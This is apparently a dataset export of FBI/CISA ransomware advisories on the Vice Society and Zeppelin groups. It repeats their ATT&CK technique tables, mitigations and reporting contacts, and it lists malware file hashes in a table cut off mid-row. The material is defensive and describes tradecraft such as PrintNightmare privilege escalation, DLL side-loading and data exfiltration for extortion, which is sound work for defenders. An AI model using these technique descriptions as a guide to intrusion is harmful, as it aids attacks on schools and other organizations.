fb91e471cfa246beb9618e1689f1ae1d
a0ee0761602470e24bcea5f403e8d1e8bfa29832


 
3122ea585623531df2e860e7d0df0f25cce39b21


 
41dc0ba220f30c70aea019de214eccd650bc6f37


 
c9c2b6a5b930392b98f132f5395d54947391cb79



MITRE ATT&CK TECHNIQUES
Vice Society actors have used ATT&CK techniques, similar to Zeppelin techniques, listed in Table 2.
Table 2: Vice Society Actors ATT&CK Techniques for Enterprise



Initial Access


Technique Title
ID
Use


Exploit Public-Facing Application
T1190
Vice Society actors exploit vulnerabilities in an internet-facing systems to gain access to victims’ networks.


Valid Accounts
T1078
Vice Society actors obtain initial network access through compromised valid accounts.


Execution


Technique Title
ID
Use


Windows Management Instrumentation (WMI)
T1047
Vice Society actors leverage WMI as a means of “living off the land” to execute malicious commands. WMI is a native Windows administration feature.


Scheduled Task/Job
T1053
Vice Society have used malicious files that create component task schedule objects, which are often mean to register a specific task to autostart on system boot. This facilitates recurring execution of their code.


Persistence


Technique Title
ID
Use


Modify System Process
T1543.003
Vice Society actors encrypt Windows Operating functions to preserve compromised system functions.


Registry Run Keys/Startup Folder
T1547.001
Vice Society actors have employed malicious files that create an undocumented autostart Registry key to maintain persistence after boot/reboot.


DLL Side-Loading
T1574.002
Vice Society actors may directly side-load their payloads by planting their own DLL then invoking a legitimate application that executes the payload within that DLL. This serves as both a persistence mechanism and a means to masquerade actions under legitimate programs.


Privilege Escalation


Technique Title
ID
Use


Exploitation for Privilege Escalation
T1068
Vice Society actors have been observed exploiting PrintNightmare vulnerability (CVE-2021-1675 and CVE-2021-34527) to escalate privileges.


Defense Evasion


Technique Title
ID
Use


Masquerading
T1036
Vice Society actors may attempt to manipulate features of the files they drop in a victim’s environment to mask the files or make the files appear legitimate.


Process Injection
T1055
Vice Society artifacts have been analyzed to reveal the ability to inject code into legitimate processes for evading process-based defenses. This tactic has other potential impacts, including the ability to escalate privileges or gain additional accesses.


Sandbox Evasion
T1497
Vice Society actors may have included sleep techniques in their files to hinder common reverse engineering or dynamic analysis.


Lateral Movement


Technique Title
ID
Use


Taint Shared Content
T1080
Vice Society actors may deliver payloads to remote systems by adding content to shared storage locations such as network drives.


Exfiltration


Technique Title
ID
Use


Exfiltration
TA0010
Vice Society actors are known for double extortion, which is a second attempt to force a victim to pay by threatening to expose sensitive information if the victim does not pay a ransom.


Impact


Technique Title
ID
Use


Data Encrypted for Impact
T1486
Vice Society actors have encrypted data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources.


Account Access Removal
T1531
Vice Society actors run a script to change passwords of victims’ email accounts.



 
 

Mitigations

The FBI and CISA recommend organizations, particularly the education sector, establish and maintain strong liaison relationships with the FBI Field Office in their region and their regional CISA Cybersecurity Advisor. The location and contact information for FBI Field Offices and CISA Regional Offices can be located at www.fbi.gov/contact-us/field-offices and www.cisa.gov/cisa-regions, respectively. Through these partnerships, the FBI and CISA can assist with identifying vulnerabilities to academia and mitigating potential threat activity. The FBI and CISA further recommend that academic entities review and, if needed, update incident response and communication plans that list actions an organization will take if impacted by a cyber incident.
The FBI, CISA, and the MS-ISAC recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques and to reduce the risk of compromise by Vice Society actors:
Preparing for Cyber Incidents

Maintain offline backups of data, and regularly maintain backup and restoration.  By instituting this practice, the organization ensures they will not be severely interrupted, and/or only have irretrievable data.
Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure. Ensure your backup data is not already infected.
Review the security posture of third-party vendors and those interconnected with your organization. Ensure all connections between third-party vendors and outside software or hardware are monitored and reviewed for suspicious activity.
Implement listing policies for applications and remote access that only allow systems to execute known and permitted programs under an established security policy.
Document and monitor external remote connections. Organizations should document approved solutions for remote management and maintenance, and immediately investigate if an unapproved solution is installed on a workstation.
Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage device, the cloud).

Identity and Access Management

Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with National Institute of Standards and Technology (NIST) standards for developing and managing password policies.

Use longer passwords consisting of at least 8 characters and no more than 64 characters in length;
Store passwords in hashed format using industry-recognized password managers;
Add password user “salts” to shared login credentials;
Avoid reusing passwords;
Implement multiple failed login attempt account lockouts;
Disable password “hints”;
Refrain from requiring password changes more frequently than once per year unless a password is known or suspected to be compromised.Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.
Require administrator credentials to install software.


Require phishing-resistant multifactor authentication for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems.
Review domain controllers, servers, workstations, and active directories for new and/or unrecognized accounts.
Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege. 
Implement time-based access for accounts set at the admin level and higher. For example, the Just-in-Time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the Active Directory level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task.

Protective Controls and Architecture

Segment networks to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement.
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting the ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host.
Install, regularly update, and enable real time detection for antivirus software on all hosts.
Secure and closely monitor remote desktop protocol (RDP) use.

Limit access to resources over internal networks, especially by restricting RDP and using virtual desktop infrastructure. If RDP is deemed operationally necessary, restrict the originating sources and require MFA to mitigate credential theft and reuse. If RDP must be available externally, use a VPN, virtual desktop infrastructure, or other means to authenticate and secure the connection before allowing RDP to connect to internal devices. Monitor remote access/RDP logs, enforce account lockouts after a specified number of attempts to block brute force campaigns, log RDP login attempts, and disable unused remote access/RDP ports.



Vulnerability and Configuration Management

Keep all operating systems, software, and firmware up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Organizations should prioritize patching of vulnerabilities on CISA’s Known Exploited Vulnerabilities catalog.
Disable unused ports.
Consider adding an email banner to emails received from outside your organization.
Disable hyperlinks in received emails.
Disable command-line and scripting activities and permissions. Privilege escalation and lateral movement often depend on software utilities running from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally.
Ensure devices are properly configured and that security features are enabled.
Disable ports and protocols that are not being used for a business purpose (e.g., RDP Transmission Control Protocol Port 3389).
Restrict Server Message Block (SMB) Protocol within the network to only access servers that are necessary, and remove or disable outdated versions of SMB (i.e., SMB version 1). Threat actors use SMB to propagate malware across organizations.

REFERENCES

Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.
Resource to mitigate a ransomware attack: CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide.
No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness Assessment.

REPORTING
The FBI is seeking any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with Vice Society actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file.
The FBI, CISA, and the MS-ISAC strongly discourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to a local FBI Field Office, or to CISA at report@cisa.gov or by calling 1-844-Say-CISA (1-844-729-2472). SLTT government entities can also report to the MS-ISAC (SOC@cisecurity.org or 866-787-4722).
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. The FBI, CISA, and the MS-ISAC do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the FBI, CISA, or the MS-ISAC.

Revisions

September 6, 2022: Initial Version






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1190', 'T1068', 'T1543.003', 'T1486', 'T1078', 'T1047', 'T1053', 'T1055', 'T1531', 'T1574.002', 'TA0010', 'T1080', 'T1036', 'T1547.001', 'T1497'}","




Summary

Actions to take today to mitigate cyber threats from ransomware:• Prioritize and remediate known exploited vulnerabilities.• Train users to recognize and report phishing attempts.• Enable and enforce multifactor authentication.
Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), and the Multi-State Information Sharing and Analysis Center (MS-ISAC) are releasing this joint CSA to disseminate IOCs and TTPs associated with Vice Society actors identified through FBI investigations as recently as September 2022. The FBI, CISA, and the MS-ISAC have recently observed Vice Society actors disproportionately targeting the education sector with ransomware attacks.
Over the past several years, the education sector, especially kindergarten through twelfth grade (K-12) institutions, have been a frequent target of ransomware attacks. Impacts from these attacks have ranged from restricted access to networks and data, delayed exams, canceled school days, and unauthorized access to and theft of personal information regarding students and staff. The FBI, CISA, and the MS-ISAC anticipate attacks may increase as the 2022/2023 school year begins and criminal ransomware groups perceive opportunities for successful attacks. School districts with limited cybersecurity capabilities and constrained resources are often the most vulnerable; however, the opportunistic targeting often seen with cyber criminals can still put school districts with robust cybersecurity programs at risk. K-12 institutions may be seen as particularly lucrative targets due to the amount of sensitive student data accessible through school systems or their managed service providers.
The FBI, CISA, and the MS-ISAC encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of ransomware incidents.
Download the PDF version of this report: pdf, 521 KB
Download the IOCs: .stix 31 kb

Technical Details

Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 11. See MITRE ATT&CK for Enterprise for all referenced tactics and techniques.
Vice Society is an intrusion, exfiltration, and extortion hacking group that first appeared in summer 2021. Vice Society actors do not use a ransomware variant of unique origin. Instead, the actors have deployed versions of Hello Kitty/Five Hands and Zeppelin ransomware, but may deploy other variants in the future.
Vice Society actors likely obtain initial network access through compromised credentials by exploiting internet-facing applications,. Prior to deploying ransomware, the actors spend time exploring the network, identifying opportunities to increase accesses, and exfiltrating data, for double extortion--a tactic whereby actors threaten to publicly release sensitive data unless a victim pays a ransom. Vice Society actors have been observed using a variety of tools, including SystemBC, PowerShell Empire, and Cobalt Strike to move laterally. They have also used “living off the land” techniques targeting the legitimate Windows Management Instrumentation (WMI) service, and tainting shared content,.
Vice Society actors have been observed exploiting the PrintNightmare vulnerability (CVE-2021-1675 and CVE-2021-34527 ) to escalate privileges,. To maintain persistence, the criminal actors have been observed leveraging scheduled tasks, creating undocumented autostart Registry keys, and pointing legitimate services to their custom malicious dynamic link libraries (DLLs) through a tactic known as DLL side-loading,. Vice Society actors attempt to evade detection through masquerading their malware and tools as legitimate files, using process injection, and likely use evasion techniques to defeat automated dynamic analysis,. Vice Society actors have been observed escalating privileges, then gaining access to domain administrator accounts, and running scripts to change the passwords of victims’ network accounts to prevent the victim from remediating. 
Indicators of Compromise (IOCs)

 

 

See Table 1 for file hashes obtained from FBI incident response investigations in September 2022.
Table 1: File Hashes as of September 2022

MITRE ATT&CK TECHNIQUES
Vice Society actors have used ATT&CK techniques, similar to Zeppelin techniques, listed in Table 2.
Table 2: Vice Society Actors ATT&CK Techniques for Enterprise

 
 

Mitigations

The FBI and CISA recommend organizations, particularly the education sector, establish and maintain strong liaison relationships with the FBI Field Office in their region and their regional CISA Cybersecurity Advisor. The location and contact information for FBI Field Offices and CISA Regional Offices can be located at www.fbi.gov/contact-us/field-offices and www.cisa.gov/cisa-regions, respectively. Through these partnerships, the FBI and CISA can assist with identifying vulnerabilities to academia and mitigating potential threat activity. The FBI and CISA further recommend that academic entities review and, if needed, update incident response and communication plans that list actions an organization will take if impacted by a cyber incident.
The FBI, CISA, and the MS-ISAC recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques and to reduce the risk of compromise by Vice Society actors:
Preparing for Cyber Incidents

Maintain offline backups of data, and regularly maintain backup and restoration.  By instituting this practice, the organization ensures they will not be severely interrupted, and/or only have irretrievable data.
Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure. Ensure your backup data is not already infected.
Review the security posture of third-party vendors and those interconnected with your organization. Ensure all connections between third-party vendors and outside software or hardware are monitored and reviewed for suspicious activity.
Implement listing policies for applications and remote access that only allow systems to execute known and permitted programs under an established security policy.
Document and monitor external remote connections. Organizations should document approved solutions for remote management and maintenance, and immediately investigate if an unapproved solution is installed on a workstation.
Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage device, the cloud).

Identity and Access Management

Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with National Institute of Standards and Technology (NIST) standards for developing and managing password policies.

Use longer passwords consisting of at least 8 characters and no more than 64 characters in length;
Store passwords in hashed format using industry-recognized password managers;
Add password user “salts” to shared login credentials;
Avoid reusing passwords;
Implement multiple failed login attempt account lockouts;
Disable password “hints”;
Refrain from requiring password changes more frequently than once per year unless a password is known or suspected to be compromised.Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.
Require administrator credentials to install software.


Require phishing-resistant multifactor authentication for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems.
Review domain controllers, servers, workstations, and active directories for new and/or unrecognized accounts.
Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege. 
Implement time-based access for accounts set at the admin level and higher. For example, the Just-in-Time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the Active Directory level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task.

Protective Controls and Architecture

Segment networks to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement.
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting the ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host.
Install, regularly update, and enable real time detection for antivirus software on all hosts.
Secure and closely monitor remote desktop protocol (RDP) use.

Limit access to resources over internal networks, especially by restricting RDP and using virtual desktop infrastructure. If RDP is deemed operationally necessary, restrict the originating sources and require MFA to mitigate credential theft and reuse. If RDP must be available externally, use a VPN, virtual desktop infrastructure, or other means to authenticate and secure the connection before allowing RDP to connect to internal devices. Monitor remote access/RDP logs, enforce account lockouts after a specified number of attempts to block brute force campaigns, log RDP login attempts, and disable unused remote access/RDP ports.



Vulnerability and Configuration Management

Keep all operating systems, software, and firmware up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Organizations should prioritize patching of vulnerabilities on CISA’s Known Exploited Vulnerabilities catalog.
Disable unused ports.
Consider adding an email banner to emails received from outside your organization.
Disable hyperlinks in received emails.
Disable command-line and scripting activities and permissions. Privilege escalation and lateral movement often depend on software utilities running from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally.
Ensure devices are properly configured and that security features are enabled.
Disable ports and protocols that are not being used for a business purpose (e.g., RDP Transmission Control Protocol Port 3389).
Restrict Server Message Block (SMB) Protocol within the network to only access servers that are necessary, and remove or disable outdated versions of SMB (i.e., SMB version 1). Threat actors use SMB to propagate malware across organizations.

REFERENCES

Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.
Resource to mitigate a ransomware attack: CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide.
No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness Assessment.

REPORTING
The FBI is seeking any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with Vice Society actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file.
The FBI, CISA, and the MS-ISAC strongly discourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to a local FBI Field Office, or to CISA at report@cisa.gov or by calling 1-844-Say-CISA (1-844-729-2472). SLTT government entities can also report to the MS-ISAC (SOC@cisecurity.org or 866-787-4722).
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. The FBI, CISA, and the MS-ISAC do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the FBI, CISA, or the MS-ISAC.

Revisions

September 6, 2022: Initial Version






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-249a-0
43,"




Summary

Actions to take today to mitigate cyber threats from ransomware:

• Prioritize remediating known exploited vulnerabilities.
• Train users to recognize and report phishing attempts.
• Enable and enforce multifactor authentication.
Note: this joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
The Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency (CISA) are releasing this joint CSA to disseminate known Zeppelin ransomware IOCs and TTPs associated with ransomware variants identified through FBI investigations as recently as 21 June 2022.
The FBI and CISA encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of ransomware incidents.
Download the PDF version of this report: pdf, 999 kb
Download the YARA signature for Zeppelin: YARA Signature, .yar 125 kb
Download the IOCs: .stix 113 kb

Technical Details

Note: this advisory uses the MITRE ATT&CK® for Enterprise framework, version 11. See MITRE ATT&CK for Enterprise for all referenced tactics and techniques.
Zeppelin ransomware is a derivative of the Delphi-based Vega malware family and functions as a Ransomware as a Service (RaaS). From 2019 through at least June 2022, actors have used this malware to target a wide range of businesses and critical infrastructure organizations, including defense contractors, educational institutions, manufacturers, technology companies, and especially organizations in the healthcare and medical industries. Zeppelin actors have been known to request ransom payments in Bitcoin, with initial amounts ranging from several thousand dollars to over a million dollars.
Zeppelin actors gain access to victim networks via RDP exploitation [T1133], exploiting SonicWall firewall vulnerabilities [T1190], and phishing campaigns [T1566]. Prior to deploying Zeppelin ransomware, actors spend one to two weeks mapping or enumerating the victim network to identify data enclaves, including cloud storage and network backups [TA0007]. Zeppelin actors can deploy Zeppelin ransomware as a .dll or .exe file or contained within a PowerShell loader. [1] 
Prior to encryption, Zeppelin actors exfiltrate [TA0010] sensitive company data files to sell or publish in the event the victim refuses to pay the ransom. Once the ransomware is executed, a randomized nine-digit hexadecimal number is appended to each encrypted file as a file extension, e.g., file.txt.txt.C59-E0C-929 [T1486]. A note file with a ransom note is left on compromised systems, frequently on the desktop (see figure 1 below).
 



Figure 1: Sample Ransom Note

 
The FBI has observed instances where Zeppelin actors executed their malware multiple times within a victim’s network, resulting in the creation of different IDs or file extensions, for each instance of an attack; this results in the victim needing several unique decryption keys.
 
Indicators of Compromise (IOC)
See table 1 below for IOCs as of June 2022 obtained from FBI incident response investigations.




MD5


SHA1


 SHA256




981526650af8d6f8f20177a26abb513a


4fee2cb5c98abbe556e9c7ccfebe9df4f8cde53f


001938ed01bfde6b100927ff8199c65d1bff30381b80b846f2e3fe5a0d2df21d




c25d45e9bbfea29cb6d9ee0d9bf2864d


eaeff8d315cca71e997063a2baec5cc73fad9453


a42185d506e08160cb96c81801fbe173fb071f4a2f284830580541e057f4423b




183b6b0c90c1e0276a2015752344a4cf


1cb5e8132302b420af9b1e5f333c507d8b2a2441


aa7e2d63fc991990958dfb795a0aed254149f185f403231eaebe35147f4b5ebe




9349e1cc3de7c7f6893a21bd6c3c4a6b


db398e38ee6221df7e4aa49d8f96799cca4d87e1


a2a9385cbbcfacc2d541f5bd92c38b0376b15002901b2fd1cc62859e161a8037




c8f75487d0d496a3746e6c81a5ecc6dc


4b91a91a98a2f0128c80f8ceeef0f5d293adf0cd


54d567812eca7fc5f2ff566e7fb8a93618b6d2357ce71776238e0b94d55172b1




477eedb422041385e59a4fff72cb97c1


9892cc90e6712d3548e45f34f14f362bccedf0be


fb59f163a2372d09cd0fc75341d3972fdd3087d2d507961303656b1d791b17c6






5841ef35aaff08bb03d25e5afe3856a2


ffd228b0d7afe7cab4e9734f7093e7ba01c5a06e


1e3c5a0aa079f8dfcc49cdca82891ab78d016a919d9810120b79c5deb332f388




d6c4b253ab1d169cf312fec12cc9a28f


0f47c279fea1423c7a0e7bc967d9ff3fae7a0de8


347f14497df4df73bc414f4e852c5490b12db991a4b3811712bac7476a3f1bc9




fba7180ad49d6a7f3c60c890e2784704


f561f9e3c949fe87f12dbfa166ffb2eb85712419


7d8c4c742689c097ac861fcbf7734709fd7dcab1f7ef2ceffb4b0b7dec109f55




bc6c991941d9afbd522fa0a2a248a97a


a243ce234fc8294e2e2e526418b4eaadc2d6c84f


37c320983ae4c1fd0897736a53e5b0481edb1d1d91b366f047aa024b0fc0a86e




f3490951ae51922cb360a3d76a670159


e2cb60be111716e32db7ca2365ad6e73c30f0e21


894b03ed203cfa712a28ec472efec0ca9a55d6058115970fe7d1697a3ddb0072




e4f1f05c2e6c3fc2f3336a8c8799ffb4


dbd9fcf2b05e703d34181c46f4c22392b9fcc1da


307877881957a297e41d75c84e9a965f1cd07ac9d026314dcaff55c4da23d03e




aa2048271f0aef3383480ce4a7c93b52


512b16ea74027fa4d0055831de5e51278812c8de


bafd3434f3ba5bb9685e239762281d4c7504de7e0cfd9d6394e4a85b4882ff5d




f66b738e1bfe1f8aab510abed850c424


571f50fee0acad1da39fe06c75116461800cc719


faa79c796c27b11c4f007023e50509662eac4bca99a71b26a9122c260abfb3c6




bb30f050546f5d6e61fafc59eaf097c3


ee44179f64918f72a8d2e88a5074d89efab3d81b


e48cf17caffc40815efb907e522475722f059990afc19ac516592231a783e878




78621f1e196497d440afb57f4609fcf9


eed7c3bb3fc5181b88abeed2204997f350324022


4a4be110d587421ad50d2b1a38b108fa05f314631066a2e96a1c85cc05814080




f4e0ee0200de397691748a2cdcd7e34a


bd3f6b878284a63c72e8354e877e3f48d6fca53c


9ef90ec912543cc24e18e73299296f14cb2c931a5d633d4c097efa372ae59846




cf5a358a22326f09fd55983bb812b7d8


1addcffae4fd4211ea24202783c2ffad6771aa34


dd89d939c941a53d6188232288a3bd73ba9baf0b4ca6bf6ccca697d9ee42533f




7afe492a38ca6f27e24028aab68406b5


5870a3adbce9737319f3c9461586d5f2afbc7adb


79d6e498e7789aaccd8caa610e8c15836267c6a668c322111708cf80bc38286c




1da1c0115caca5ebf064380eb7490041


5edb8b651c7013ebaba2eb81c87df76a1e0724d6


b22b3625bcce7b010c0ee621434878c5f8d7691c2a101ae248dd221a70668ac0




8c3c663ffcf363d087f4e114a79945ca


905726d178962dd1d7fe87504d051aca440740b8


961fbc7641f04f9fed8391c387f01d64435dda6af1164be58c4cb808b08cc910




17c5cae3bce5832dd42986fe612517d9


6f70e73c53d7622d8c4808ae7849133df1343484


d618c1ccd24d29e911cd3e899a4df2625155297e80f4c5c1354bc2e79f70768c




bfe7f54f1f0640936dd7a3384608b1f6


9436ccee41c01ca3cb4db55c10884615aba76d19


8170612574f914eec9e66902767b834432a75b1d6ae510f77546af2a291a48a2




f28af04ef0370addfebfdd31f1ec25ed


cfcfa995c15d9f33de21d0dd88d3b95d0f91d6bc


5326f52bd9a7a52759fe2fde3407dc28e8c2caa33abf1c09c47b192a1c004c12




f3bcad5358f89df1eb0294ef53f54437


eb036759beb28f86ee981bdca4fad24152b82d8c


6bafc7e2c7edc2167db187f50106e57b49d4a0e1b9269f1d8a40f824f2ccb42b




b1f6370582fbaf5c51e826fecef53cd7


4b2d0127699f708a8116bff8f25c9d6140033197


f7af51f1b2b98b482885b702508bd65d310108a506e6d8cef3986e69f972c67d




de785ed922d4e737dc0fa0bb30a4de8b


4d280105e724db851f03de8fc76409ef4057ff2c


bc214c74bdf6f6781f0de994750ba3c50c0e10d9db3483183bd47f5cef154509




7a296f7c1ac4aeee18d4c23476735be7


c13542310f7a4e50a78247fc7334096ca09c5d7f


ed1548744db512a5502474116828f75737aec8bb11133d5e4ad44be16aa3666b




37f18b38e1af6533d93bbb3f2ddb86dc


d3929331d9bc278dea5607aec1574012a08de861


cf9b6dda84cbf2dbfc6edd7a740f50bddc128842565c590d8126e5d93c024ff2




291de974e5cbe5e3d47e3d17487e027f


def93f18aaf146fe8f3c4f9a257364f181197608


21807d9fcaa91a0945e80d92778760e7856268883d36139a1ad29ab91f9d983d




99d59c862a082b207a868e409ce2d97c


908a9026d61717b5fa29959478a9bd939da9206f


0d22d3d637930e7c26a0f16513ec438243a8a01ea9c9d856acbcda61fcb7b499




d27125d534e398f1873b7f4835a79f09


1862f063c30cd02cfea6070d3dba41ac5eee2a35


6fbfc8319ed7996761b613c18c8cb6b92a1eaed1555dae6c6b8e2594ac5fa2b9




4534f2afe5f7df1d998f37ad4e35afeb


e2cc94e471509f9fa58620b8bb56d77f2cfe74b0


e8596675fef4ad8378e4220c22f4358fdb4a20531b59d7df5382c421867520a9




7ab0676262c681b8ec15bdada17d7476


2f1803d444891abb604864d476a8feac0d614f77


353e59e96cbf6ea6c16d06da5579d3815aaaeeefacabd7b35ba31f7b17207c5b




d7d3d23a5e796be844af443bda5cd67e


a9771c591f6ccc2f3419d571c64ab93228785771


85f9bf4d07bc2ac1891e367f077dd513d6ca07705bffd1b648d32a7b2dc396f5




0a1cd4efda7543cec406a6822418daf6


af4f8d889d6a2049e7a379ea197f8cd361feb074


614cb70659ef5bb2f641f09785adc4ab5873e0564a5303252d3c141a899253b2




23eda650479fc4908d0ddff713508025


b1e6527c10f68586f7f1a279ed439d46c3f12a06


fb3e0f1e6f53ffe680d66d2143f06eb6363897d374dc5dc63eb2f28188b8ad83




6607d8c1a28d7538e2a6565cf40d1260


f618879c011cde344066072949f025827feea663


594df9c402abfdc3c838d871c3395ac047f256b2ac2fd6ff66b371252978348d




caa7a669da39ffd8a3a4f3419018b363


44538b7f8f065e3cef0049089a8522a76a7fccc6


2dffe3ba5c70af51ddf0ff5a322eba0746f3bf3ae0751beb3dc0059ed3faaf3d




48b844494a746ca96c7b96d6bd90f45f


7bf83b98f798f3a8f4ce85b6d29554a435e516e3


45fba1ef399f41227ae4d14228253237b5eb464f56cab92c91a6a964dc790622




9c13ab7b79aec8dc02869999773cd4b2


4b4d865132329e0dd1d129e85fc4fa9ad0c1d206 


774ef04333c3fb2a6a4407654e28c2900c62bd202ad6e5909336eb9bc180d279




450e5bf4b42691924d09267ac1a570cb


665a563157f4aa0033a15c88f55ac4fa28397b49


677035259ba8342f1a624fd09168c42017bdca9ebc0b39bf6c37852899331460




51104215a618a5f56ad9c884d6832f79


801580a46f9759ceeeebbce419d879e2ed6943fe


26ec12b63c0e4e60d839aea592c4b5dcff853589b53626e1dbf8c656f4ee6c64




73627cbe2ba139e2ec26889a4e8d6284


1116dc35993fce8118e1e5421000a70b6777433f


37efe10b04090995e2f3d9f932c3653b27a65fc76811fa583934a725d41a6b08




935f54b6609c5339001579e96dc34244


a809327d39fab61bfcfac0c97b1d4b3bfb9a2cfe


a5847867730e7849117c31cdae8bb0a25004635d49f366fbfaebce034d865d7d




ba681db97f283c2e784d9bb4969b1f5a


5d28acf52f399793e82ec7e79da47d372d9175d7


e61edbddf9aed8a52e9be1165a0440f1b6e9943ae634148df0d0517a0cf2db13




c1ab7b68262b5ab31c45327e7138fd25


b8c74327831e460d2b2a8eb7e68ee68938779d8d


746f0c02c832b079aec221c04d2a4eb790287f6d10d39b95595a7df4086f457f




f818938b987236cdd41195796b4c1fb5


bfed40f050175935277c802cbbbce132f44c06ec


b191a004b6d8a706aba82a2d1052bcb7bed0c286a0a6e4e0c4723f073af52e7c




0a1cd4efda7543cec406a6822418daf6


af4f8d889d6a2049e7a379ea197f8cd361feb074


614cb70659ef5bb2f641f09785adc4ab5873e0564a5303252d3c141a899253b2




d7d3d23a5e796be844af443bda5cd67e


a9771c591f6ccc2f3419d571c64ab93228785771


85f9bf4d07bc2ac1891e367f077dd513d6ca07705bffd1b648d32a7b2dc396f5




7ab0676262c681b8ec15bdada17d7476


2f1803d444891abb604864d476a8feac0d614f77


353e59e96cbf6ea6c16d06da5579d3815aaaeeefacabd7b35ba31f7b17207c5b




4534f2afe5f7df1d998f37ad4e35afeb


e2cc94e471509f9fa58620b8bb56d77f2cfe74b0


e8596675fef4ad8378e4220c22f4358fdb4a20531b59d7df5382c421867520a9




d27125d534e398f1873b7f4835a79f09


1862f063c30cd02cfea6070d3dba41ac5eee2a35


6fbfc8319ed7996761b613c18c8cb6b92a1eaed1555dae6c6b8e2594ac5fa2b9




99d59c862a082b207a868e409ce2d97c


908a9026d61717b5fa29959478a9bd939da9206f


